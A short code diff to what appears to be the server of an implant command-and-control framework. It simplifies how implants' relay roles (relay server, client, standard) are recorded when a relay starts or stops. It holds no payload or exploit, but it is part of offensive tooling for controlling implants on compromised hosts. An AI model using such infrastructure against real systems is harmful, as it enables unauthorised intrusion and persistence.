@@ -804,14 +804,9 @@ def nim_implants_server(xor_key):
                         current_role = db.db_get_nimplant_relay_role(np.guid) or "STANDARD"
                         utils.nimplant_print(f"DEBUG: Detected relay server start response - current role: {current_role}")
                         
-                        if current_role == "RELAY_CLIENT":
-                            # RELAY_CLIENT + relay server = RELAY_HYBRID
-                            new_role = "RELAY_HYBRID"
-                            utils.nimplant_print(f"DEBUG: RELAY_CLIENT starting relay server → RELAY_HYBRID")
-                        else:
-                            # STANDARD + relay server = RELAY_SERVER
-                            new_role = "RELAY_SERVER"
-                            utils.nimplant_print(f"DEBUG: STANDARD starting relay server → RELAY_SERVER")
+                        # SIMPLIFIED: Any agent starting relay server becomes RELAY_SERVER
+                        new_role = "RELAY_SERVER"
+                        utils.nimplant_print(f"DEBUG: {current_role} starting relay server → RELAY_SERVER")
                         
                         db.db_update_nimplant_relay_role(np.guid, new_role)
                         utils.nimplant_print(f"DEBUG: Updated {np.guid} role to {new_role}")
@@ -821,14 +816,9 @@ def nim_implants_server(xor_key):
                         current_role = db.db_get_nimplant_relay_role(np.guid) or "STANDARD"
                         utils.nimplant_print(f"DEBUG: Detected relay server stop/failure response - current role: {current_role}")
                         
-                        if current_role == "RELAY_HYBRID":
-                            # RELAY_HYBRID stopping relay server = RELAY_CLIENT (still has upstream connection)
-                            new_role = "RELAY_CLIENT"
-                            utils.nimplant_print(f"DEBUG: RELAY_HYBRID stopping relay server → RELAY_CLIENT")
-                        else:
-                            # RELAY_SERVER stopping relay server = STANDARD
-                            new_role = "STANDARD"
-                            utils.nimplant_print(f"DEBUG: RELAY_SERVER stopping relay server → STANDARD")
+                        # SIMPLIFIED: Any agent stopping relay server becomes STANDARD
+                        new_role = "STANDARD"
+                        utils.nimplant_print(f"DEBUG: {current_role} stopping relay server → STANDARD")
                         
                         db.db_update_nimplant_relay_role(np.guid, new_role)
                         utils.nimplant_print(f"DEBUG: Updated {np.guid} role to {new_role}")
